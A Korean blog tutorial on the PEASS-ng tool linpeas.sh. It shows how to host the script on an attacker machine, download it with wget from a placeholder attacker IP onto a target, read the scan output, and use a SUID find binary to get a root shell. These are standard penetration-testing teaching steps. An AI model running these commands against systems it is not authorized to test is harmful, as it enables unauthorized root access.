---
layout: post
title: "PEASS-ng (Privilege Escalation)"
date: 2025-09-04 17:00:00 +0900
categories: [system-hacking]
---

## 1. 개요

**PEASS-ng (Privilege Escalation Awesome Scripts SUITE new generation)**는 권한 상승 취약점을 자동으로 탐지해 주는 강력한 스크립트 도구 모음이다.
특히 리눅스용인 `linpeas.sh`는 커널 취약점, SUID 파일, 잘못된 설정, 크론 작업 등 시스템 내부의 거의 모든 잠재적 위협을 스캔하고 색상 코드로 위험도를 시각화해준다.
본 글에서는 `linpeas.sh`를 대상 서버에 전송하고 실행하는 방법과, 스캔 결과를 분석하여 실제 SUID 취약점을 이용해 Root 권한을 획득하는 과정을 다룬다.

---

## 2. 설치 및 실행

스크립트를 대상 서버로 옮겨 실행 권한을 부여하고 실행해야 한다.

### 1단계: 스크립트 전송
공격자 PC에서 웹 서버를 열고, 대상 서버에서 다운로드하는 방식이 일반적이다.

**Attacker PC (Web Server)**
```bash
# linpeas.sh가 있는 디렉터리에서 실행
python3 -m http.server 8000
```

**Target Server**
```bash
# 쓰기 권한이 있는 디렉터리(/tmp)로 이동
cd /tmp
wget http://[Attacker IP]:8000/linpeas.sh
```

### 2단계: 실행 권한 부여 및 실행
```bash
chmod +x linpeas.sh
./linpeas.sh
```

---

## 3. 스캔 결과 분석

`linpeas.sh`는 스캔 결과에서 위험도에 따라 색상을 구분하여 출력한다.

*   **RED/YELLOW (빨강/노랑 배경)**: 95% 확률로 권한 상승이 가능한 매우 치명적인 취약점. (우선 순위 1순위)
*   **RED (빨강)**: 주목해야 할 흥미로운 설정이나 잠재적 위협.
*   **Green (초록)**: 일반적인 시스템 설정 정보.

![Linpeas.sh](/assets/images/system-hacking/Lin_1.png)

결과 리포트에서 `SUID` 섹션이나 `Sudo` 권한 (`sudo -l`) 정보를 중점적으로 확인해야 한다. 예를 들어 [GTFOBins](https://gtfobins.github.io/)에 등재된 바이너리가 빨간색/노란색으로 표시된다면 이를 이용해 손쉽게 권한을 상승시킬 수 있다.

---

## 4. 공격 실습: SUID 권한 상승

`linpeas.sh`가 탐지한 SUID 취약점을 이용하여 `root` 권한을 획득하는 전체 과정이다.

### 1. 정보 수집
`linpeas.sh` 실행 결과, `SUID/SGID Binaries` 섹션에서 `/usr/bin/find` 파일이 **Red/Yellow** 색상으로 강조된 것을 확인했다. 이는 `find` 명령어를 통해 권한 상승이 가능함을 의미한다.

![LinpeasSuid](/assets/images/system-hacking/Lin_2.png)

### 2. 악용 방법 검색
**GTFOBins** 사이트에서 `find`를 검색하고 `SUID` 항목을 확인한다. 다음과 같이 쉘을 실행할 수 있는 명령어가 제공된다.

```bash
find . -exec /bin/sh -p \; -quit
```

### 3. 공격 실행
일반 사용자 쉘에서 위 명령어를 그대로 실행한다.

```bash
find . -exec /bin/sh -p \; -quit
# whoami
root
```

![LinpeasRoot](/assets/images/system-hacking/Lin_3.png)

*   `-p` 옵션은 쉘이 유효 사용자 ID(`euid`)를 유지하도록 하여, SUID로 인해 부여된 `root` 권한을 떨어뜨리지 않게 한다.
*   명령어 실행 후 `whoami`를 입력하면 `root`가 반환되어 시스템을 완전히 장악했음을 확인할 수 있다.

<hr class="short-rule">